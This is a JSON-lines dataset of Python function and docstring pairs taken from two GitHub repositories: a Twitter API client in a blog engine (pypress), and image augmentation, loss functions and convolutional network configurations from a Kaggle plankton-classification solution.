{"docstring": "'''Set the X-Twitter HTTP headers that will be sent to the server.\n\nArgs:\n  client:\n     The client name as a string.  Will be sent to the server as\n     the 'X-Twitter-Client' header.\n  url:\n     The URL of the meta.xml as a string.  Will be sent to the server\n     as the 'X-Twitter-Client-URL' header.\n  version:\n     The client version as a string.  Will be sent to the server\n     as the 'X-Twitter-Client-Version' header.\n'''\n", "func_signal": "def SetXTwitterHeaders(self, client, url, version):\n", "code": "self._request_headers['X-Twitter-Client'] = client\nself._request_headers['X-Twitter-Client-URL'] = url\nself._request_headers['X-Twitter-Client-Version'] = version", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "\"\"\"Raises a TwitterError if twitter returns an error message.\n\nArgs:\n  data:\n    A python dict created from the Twitter json response\n\nRaises:\n  TwitterError wrapping the twitter error message if one exists.\n\"\"\"\n# Twitter errors are relatively unlikely, so it is faster\n# to check first, rather than try and catch the exception\n", "func_signal": "def _CheckForTwitterError(self, data):\n", "code": "if 'error' in data:\n    raise TwitterError(data['error'])", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Fetch the sequence of twitter.User instances, one for each follower\n\nThe twitter.Api instance must be authenticated.\n\nArgs:\n  page:\n    Specifies the page of results to retrieve.\n    Note: there are pagination limits. [Optional]\n\nReturns:\n  A sequence of twitter.User instances, one for each follower\n'''\n", "func_signal": "def GetFollowers(self, page=None):\n", "code": "if not self._oauth_consumer:\n    raise TwitterError(\"twitter.Api instance must be authenticated\")\nurl = '%s/statuses/followers.json' % self.base_url\nparameters = {}\nif page:\n    parameters['page'] = page\njson = self._FetchUrl(url, parameters=parameters)\ndata = simplejson.loads(json)\nself._CheckForTwitterError(data)\nreturn [User.NewFromJsonDict(x) for x in data]", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Fetch extended information for the specified users.\n\nUsers may be specified either as lists of either user_ids,\nscreen_names, or twitter.User objects. The list of users that\nare queried is the union of all specified parameters.\n\nThe twitter.Api instance must be authenticated.\n\nArgs:\n  user_id:\n    A list of user_ids to retrieve extended information.\n    [Optional]\n  screen_name:\n    A list of screen_names to retrieve extended information.\n    [Optional]\n  users:\n    A list of twitter.User objects to retrieve extended information.\n    [Optional]\n\nReturns:\n  A list of twitter.User objects for the requested users\n'''\n\n", "func_signal": "def UsersLookup(self, user_id=None, screen_name=None, users=None):\n", "code": "if not self._oauth_consumer:\n    raise TwitterError(\"The twitter.Api instance must be authenticated.\")\nif not user_id and not screen_name and not users:\n    raise TwitterError(\"Specify at least on of user_id, screen_name, or users.\")\nurl = '%s/users/lookup.json' % self.base_url\nparameters = {}\nuids = list()\nif user_id:\n    uids.extend(user_id)\nif users:\n    uids.extend([u.id for u in users])\nif len(uids):\n    parameters['user_id'] = ','.join([\"%s\" % u for u in uids])\nif screen_name:\n    parameters['screen_name'] = ','.join(screen_name)\njson = self._FetchUrl(url, parameters=parameters)\ndata = simplejson.loads(json)\nself._CheckForTwitterError(data)\nreturn [User.NewFromJsonDict(u) for u in data]", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Destroys the subscription to a list for the authenticated user\n\nThe twitter.Api instance must be authenticated.\n\nArgs:\n  owner:\n    The user id or screen name of the user that owns the\n    list that is to be unsubscribed from\n  list:\n    The slug or list id of the list to unsubscribe from\n\nReturns:\n  A twitter.List instance representing the removed list.\n'''\n", "func_signal": "def DestroySubscription(self, owner, list):\n", "code": "url = '%s/%s/%s/subscribers.json' % (self.base_url, owner, list)\njson = self._FetchUrl(url, post_data={'_method': 'DELETE', 'list_id': list})\ndata = simplejson.loads(json)\nself._CheckForTwitterError(data)\nreturn List.NewFromJsonDict(data)", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Destroys the direct message specified in the required ID parameter.\n\nThe twitter.Api instance must be authenticated, and the\nauthenticating user must be the recipient of the specified direct\nmessage.\n\nArgs:\n  id: The id of the direct message to be destroyed\n\nReturns:\n  A twitter.DirectMessage instance representing the message destroyed\n'''\n", "func_signal": "def DestroyDirectMessage(self, id):\n", "code": "url = '%s/direct_messages/destroy/%s.json' % (self.base_url, id)\njson = self._FetchUrl(url, post_data={'id': id})\ndata = simplejson.loads(json)\nself._CheckForTwitterError(data)\nreturn DirectMessage.NewFromJsonDict(data)", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "\"\"\"\nLoads user from flaskext.principal.Identity instance and\nassigns permissions from user.\n\nA \"user\" instance is monkeypatched to the identity instance.\n\nIf no user found then None is returned.\n\"\"\"\n\n", "func_signal": "def from_identity(self, identity):\n", "code": "try:\n    user = self.get(int(identity.name))\nexcept ValueError:\n    user = None\n\nif user:\n    identity.provides.update(user.provides)\n\nidentity.user = user\n\nreturn user", "path": "pypress\\models\\users.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Returns a list of twitter user id's for every person\nthe specified user is following.\n\nArgs:\n  user:\n    The id or screen_name of the user to retrieve the id list for\n    [Optional]\n\nReturns:\n  A list of integers, one for each user id.\n'''\n", "func_signal": "def GetFriendIDs(self, user=None, cursor=-1):\n", "code": "if not user and not self._oauth_consumer:\n    raise TwitterError(\"twitter.Api instance must be authenticated\")\nif user:\n    url = '%s/friends/ids/%s.json' % (self.base_url, user)\nelse:\n    url = '%s/friends/ids.json' % self.base_url\nparameters = {}\nparameters['cursor'] = cursor\njson = self._FetchUrl(url, parameters=parameters)\ndata = simplejson.loads(json)\nself._CheckForTwitterError(data)\nreturn data", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Create a new instance based on a JSON dict\n\nArgs:\n  data:\n    A JSON dict\n  timestamp:\n    Gets set as the timestamp property of the new object\n\nReturns:\n  A twitter.Trend object\n'''\n", "func_signal": "def NewFromJsonDict(data, timestamp = None):\n", "code": "return Trend(name=data.get('name', None),\n             query=data.get('query', None),\n             timestamp=timestamp)", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Un-favorites the status specified in the ID parameter as the authenticating user.\nReturns the un-favorited status in the requested format when successful.\n\nThe twitter.Api instance must be authenticated.\n\nArgs:\n  The twitter.Status to unmark as a favorite.\nReturns:\n  A twitter.Status instance representing the newly-unmarked favorite.\n'''\n", "func_signal": "def DestroyFavorite(self, status):\n", "code": "url = '%s/favorites/destroy/%s.json' % (self.base_url, status.id)\njson = self._FetchUrl(url, post_data={'id': status.id})\ndata = simplejson.loads(json)\nself._CheckForTwitterError(data)\nreturn Status.NewFromJsonDict(data)", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Returns a single status message.\n\nThe twitter.Api instance must be authenticated if the\nstatus message is private.\n\nArgs:\n  id:\n    The numeric ID of the status you are trying to retrieve.\n\nReturns:\n  A twitter.Status instance representing that status message\n'''\n", "func_signal": "def GetStatus(self, id):\n", "code": "try:\n    if id:\n        long(id)\nexcept:\n    raise TwitterError(\"id must be an long integer\")\nurl = '%s/statuses/show/%s.json' % (self.base_url, id)\njson = self._FetchUrl(url)\ndata = simplejson.loads(json)\nself._CheckForTwitterError(data)\nreturn Status.NewFromJsonDict(data)", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "'''Post a twitter status message from the authenticated user.\n\nThe twitter.Api instance must be authenticated.\n\nArgs:\n  status:\n    The message text to be posted.\n    Must be less than or equal to 140 characters.\n  in_reply_to_status_id:\n    The ID of an existing status that the status to be posted is\n    in reply to.  This implicitly sets the in_reply_to_user_id\n    attribute of the resulting status to the user ID of the\n    message being replied to.  Invalid/missing status IDs will be\n    ignored. [Optional]\nReturns:\n  A twitter.Status instance representing the message posted.\n'''\n", "func_signal": "def PostUpdate(self, status, in_reply_to_status_id=None):\n", "code": "if not self._oauth_consumer:\n    raise TwitterError(\"The twitter.Api instance must be authenticated.\")\n\nurl = '%s/statuses/update.json' % self.base_url\n\nif isinstance(status, unicode) or self._input_encoding is None:\n    u_status = status\nelse:\n    u_status = unicode(status, self._input_encoding)\n\nif len(u_status) > CHARACTER_LIMIT:\n    raise TwitterError(\"Text must be less than or equal to %d characters. \"\n                     \"Consider using PostUpdates.\" % CHARACTER_LIMIT)\n\ndata = {'status': status}\nif in_reply_to_status_id:\n    data['in_reply_to_status_id'] = in_reply_to_status_id\njson = self._FetchUrl(url, post_data=data)\ndata = simplejson.loads(json)\nself._CheckForTwitterError(data)\nreturn Status.NewFromJsonDict(data)", "path": "pypress\\twitter.py", "repo_name": "laoqiu/pypress", "stars": 547, "license": "None", "language": "python", "size": 356}
{"docstring": "\"\"\"\nThese are used to ensure that zooming and rotation happens around the center of the image.\nUse these transforms to center and uncenter the image around such a transform.\n\"\"\"\n", "func_signal": "def build_center_uncenter_transforms(image_shape):\n", "code": "center_shift = np.array([image_shape[1], image_shape[0]]) / 2.0 - 0.5 # need to swap rows and cols here apparently! confusing!\ntform_uncenter = skimage.transform.SimilarityTransform(translation=-center_shift)\ntform_center = skimage.transform.SimilarityTransform(translation=center_shift)\nreturn tform_center, tform_uncenter", "path": "data.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nLoad all images into memory for faster processing\n\"\"\"\n", "func_signal": "def load(subset='train'):\n", "code": "images = np.empty(len(paths[subset]), dtype='object')\nfor k, path in enumerate(paths[subset]):\n    img = skimage.io.imread(path, as_grey=True)\n    images[k] = img\n\nreturn images", "path": "create_data_files.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nscale is a DOWNSCALING factor.\n\"\"\"\n", "func_signal": "def perturb_rescaled_gaussian(img, scale, augmentation_params, target_shape=(50, 50), rng=np.random):\n", "code": "tform_rescale = build_rescale_transform(scale, img.shape, target_shape) # also does centering\ntform_center, tform_uncenter = build_center_uncenter_transforms(img.shape)\ntform_augment = random_perturbation_transform_gaussian(rng=rng, **augmentation_params)\ntform_augment = tform_uncenter + tform_augment + tform_center # shift to center, augment, shift back (for the rotation/shearing)\nreturn fast_warp(img, tform_rescale + tform_augment, output_shape=target_shape, mode='constant').astype('float32')", "path": "data.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\ncross entropy loss per example, summed over classes\n\"\"\"\n", "func_signal": "def log_losses(y, t, eps=1e-15):\n", "code": "y = T.clip(y, eps, 1 - eps)\nlosses = -T.sum(t * T.log(y), axis=1)\nreturn losses", "path": "nn_plankton.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nscale is a DOWNSCALING factor.\n\"\"\"\n", "func_signal": "def perturb_rescaled(img, scale, augmentation_params, target_shape=(50, 50), rng=np.random):\n", "code": "tform_rescale = build_rescale_transform(scale, img.shape, target_shape) # also does centering\ntform_center, tform_uncenter = build_center_uncenter_transforms(img.shape)\ntform_augment = random_perturbation_transform(rng=rng, **augmentation_params)\ntform_augment = tform_uncenter + tform_augment + tform_center # shift to center, augment, shift back (for the rotation/shearing)\nreturn fast_warp(img, tform_rescale + tform_augment, output_shape=target_shape, mode='constant').astype('float32')", "path": "data.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "# variable scale part\n", "func_signal": "def build_model():\n", "code": "l0_variable = nn.layers.InputLayer((batch_size, 1, patch_sizes[0][0], patch_sizes[0][1]))\nl0c = dihedral.CyclicSliceLayer(l0_variable)\n\nl1a = Conv2DLayer(l0c, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1b = Conv2DLayer(l1a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\nl1r = dihedral_fast.CyclicConvRollLayer(l1)\n\nl2a = Conv2DLayer(l1r, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2b = Conv2DLayer(l2a, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\nl2r = dihedral_fast.CyclicConvRollLayer(l2)\n\nl3a = Conv2DLayer(l2r, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3b = Conv2DLayer(l3a, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3c = Conv2DLayer(l3b, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3r = dihedral_fast.CyclicConvRollLayer(l3)\n\nl4a = Conv2DLayer(l3r, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4b = Conv2DLayer(l4a, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4c = Conv2DLayer(l4b, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl4 = MaxPool2DLayer(l4c, ds=(3, 3), strides=(2, 2))\nl4r = dihedral_fast.CyclicConvRollLayer(l4)\nl4f = nn.layers.flatten(l4r)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4f, p=0.5), num_units=1024, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl5fp = nn.layers.FeaturePoolLayer(l5, ds=2)\nl5m = dihedral.CyclicPoolLayer(l5fp, pool_function=nn_plankton.rms)\n\nl6 = nn.layers.DenseLayer(nn.layers.dropout(l5m, p=0.5), num_units=1024, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl6fp = nn.layers.FeaturePoolLayer(l6, ds=2)\n\nl_variable = l6fp\n\n\n# fixed scale part\nl0_fixed = nn.layers.InputLayer((batch_size, 1, patch_sizes[1][0], patch_sizes[1][1]))\nl0c = dihedral.CyclicSliceLayer(l0_fixed)\n\nl1a = Conv2DLayer(l0c, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1b = Conv2DLayer(l1a, num_filters=8, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\nl1r = dihedral_fast.CyclicConvRollLayer(l1)\n\nl2a = Conv2DLayer(l1r, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2b = Conv2DLayer(l2a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\nl2r = dihedral_fast.CyclicConvRollLayer(l2)\n\nl3a = Conv2DLayer(l2r, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3b = Conv2DLayer(l3a, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3c = Conv2DLayer(l3b, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu, untie_biases=True)\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3r = dihedral_fast.CyclicConvRollLayer(l3)\nl3f = nn.layers.flatten(l3r)\n\nl4 = nn.layers.DenseLayer(nn.layers.dropout(l3f, p=0.5), num_units=512, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl4fp = nn.layers.FeaturePoolLayer(l4, ds=2)\nl4m = dihedral.CyclicPoolLayer(l4fp, pool_function=nn_plankton.rms)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4m, p=0.5), num_units=512, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1), nonlinearity=nn_plankton.leaky_relu)\nl5fp = nn.layers.FeaturePoolLayer(l5, ds=2)\n\nl_fixed = l5fp\n\n\n# merge the parts\nl_merged = nn.layers.concat([l_variable, l_fixed])\n\nl7 = nn.layers.DenseLayer(nn.layers.dropout(l_merged, p=0.5), num_units=data.num_classes, nonlinearity=T.nnet.softmax, W=nn_plankton.Orthogonal(1.0))\n\nreturn [l0_variable, l0_fixed], l7", "path": "configurations\\bagging_16_cr4_ds.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "# variable scale part\n", "func_signal": "def build_model():\n", "code": "l0_variable = nn.layers.InputLayer((batch_size, 1, patch_sizes[0][0], patch_sizes[0][1]))\nl0c = dihedral.CyclicSliceLayer(l0_variable)\n\nl1a = Conv2DLayer(l0c, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl1b = Conv2DLayer(l1a, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\n\nl2a = Conv2DLayer(l1, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl2b = Conv2DLayer(l2a, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\n\nl3a = Conv2DLayer(l2, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl3b = Conv2DLayer(l3a, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl3c = Conv2DLayer(l3b, num_filters=128, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\n\nl4a = Conv2DLayer(l3, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl4b = Conv2DLayer(l4a, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl4c = Conv2DLayer(l4b, num_filters=256, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl4 = MaxPool2DLayer(l4c, ds=(3, 3), strides=(2, 2))\nl4f = nn.layers.flatten(l4)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4f, p=0.5), num_units=256, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1))\nl5r = dihedral.CyclicRollLayer(l5)\n\nl6 = nn.layers.DenseLayer(nn.layers.dropout(l5r, p=0.5), num_units=256, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1))\nl_variable = dihedral.CyclicPoolLayer(l6, pool_function=nn_plankton.rms)\n\n\n# fixed scale part 1\nl0_fixed1 = nn.layers.InputLayer((batch_size, 1, patch_sizes[1][0], patch_sizes[1][1]))\nl0c = dihedral.CyclicSliceLayer(l0_fixed1)\n\nl1a = Conv2DLayer(l0c, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl1b = Conv2DLayer(l1a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\n\nl2a = Conv2DLayer(l1, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl2b = Conv2DLayer(l2a, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\n\nl3a = Conv2DLayer(l2, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl3b = Conv2DLayer(l3a, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl3c = Conv2DLayer(l3b, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3f = nn.layers.flatten(l3)\n\nl4 = nn.layers.DenseLayer(nn.layers.dropout(l3f, p=0.5), num_units=128, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1))\nl4r = dihedral.CyclicRollLayer(l4)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4r, p=0.5), num_units=128, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1))\nl_fixed1 = dihedral.CyclicPoolLayer(l5, pool_function=nn_plankton.rms)    \n\n\n# fixed scale part 2\nl0_fixed2 = nn.layers.InputLayer((batch_size, 1, patch_sizes[2][0], patch_sizes[2][1]))\nl0c = dihedral.CyclicSliceLayer(l0_fixed2)\n\nl1a = Conv2DLayer(l0c, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl1b = Conv2DLayer(l1a, num_filters=16, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl1 = MaxPool2DLayer(l1b, ds=(3, 3), strides=(2, 2))\n\nl2a = Conv2DLayer(l1, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl2b = Conv2DLayer(l2a, num_filters=32, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl2 = MaxPool2DLayer(l2b, ds=(3, 3), strides=(2, 2))\n\nl3a = Conv2DLayer(l2, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl3b = Conv2DLayer(l3a, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl3c = Conv2DLayer(l3b, num_filters=64, filter_size=(3, 3), border_mode=\"same\", W=nn_plankton.Conv2DOrthogonal(1.0), b=nn.init.Constant(0.1))\nl3 = MaxPool2DLayer(l3c, ds=(3, 3), strides=(2, 2))\nl3f = nn.layers.flatten(l3)\n\nl4 = nn.layers.DenseLayer(nn.layers.dropout(l3f, p=0.5), num_units=128, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1))\nl4r = dihedral.CyclicRollLayer(l4)\n\nl5 = nn.layers.DenseLayer(nn.layers.dropout(l4r, p=0.5), num_units=128, W=nn_plankton.Orthogonal(1.0), b=nn.init.Constant(0.1))\nl_fixed2 = dihedral.CyclicPoolLayer(l5, pool_function=nn_plankton.rms)    \n\n\n# merge the parts\nl_merged = nn.layers.concat([l_variable, l_fixed1, l_fixed2])\n\nl7 = nn.layers.DenseLayer(nn.layers.dropout(l_merged, p=0.5), num_units=data.num_classes, nonlinearity=T.nnet.softmax, W=nn_plankton.Orthogonal(1.0))\n\nreturn [l0_variable, l0_fixed1, l0_fixed2], l7", "path": "configurations\\triplescale_fs2_fs5.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nscale is a DOWNSCALING factor.\n\"\"\"\n", "func_signal": "def perturb_multiscale_fixed(img, scale_factors, tform_augment, target_shapes):\n", "code": "tform_center, tform_uncenter = build_center_uncenter_transforms(img.shape)\ntform_augment = tform_uncenter + tform_augment + tform_center # shift to center, augment, shift back (for the rotation/shearing)\n\noutput = []\nfor scale, target_shape in zip(scale_factors, target_shapes):\n    if isinstance(scale, skimage.transform.ProjectiveTransform):\n        tform_rescale = scale\n    else:\n        tform_rescale = build_rescale_transform(scale, img.shape, target_shape) # also does centering\n    output.append(fast_warp(img, tform_rescale + tform_augment, output_shape=target_shape, mode='constant').astype('float32'))\n\nreturn output", "path": "data.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\nGenerator that runs a slow source generator in a separate process.\nbuffer_size: the maximal number of items to pre-generate (length of the buffer)\n\"\"\"\n", "func_signal": "def buffered_gen_mp(source_gen, buffer_size=2):\n", "code": "if buffer_size < 2:\n    raise RuntimeError(\"Minimal buffer size is 2!\")\n \nbuffer = mp.Queue(maxsize=buffer_size - 1)\n# the effective buffer size is one less, because the generation process\n# will generate one extra element and block until there is room in the buffer.\n \ndef _buffered_generation_process(source_gen, buffer):\n    for data in source_gen:\n        buffer.put(data, block=True)\n    buffer.put(None) # sentinel: signal the end of the iterator\n    buffer.close() # unfortunately this does not suffice as a signal: if buffer.get()\n    # was called and subsequently the buffer is closed, it will block forever.\n \nprocess = mp.Process(target=_buffered_generation_process, args=(source_gen, buffer))\nprocess.start()\n \nfor data in iter(buffer.get, None):\n    yield data", "path": "buffering.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
{"docstring": "\"\"\"\ncross entropy loss, summed over classes, mean over batches\n\"\"\"\n", "func_signal": "def log_loss(y, t, eps=1e-15):\n", "code": "y = T.clip(y, eps, 1 - eps)\nloss = -T.sum(t * T.log(y)) / y.shape[0].astype(theano.config.floatX)\nreturn loss", "path": "nn_plankton.py", "repo_name": "benanne/kaggle-ndsb", "stars": 565, "license": "mit", "language": "python", "size": 101822}
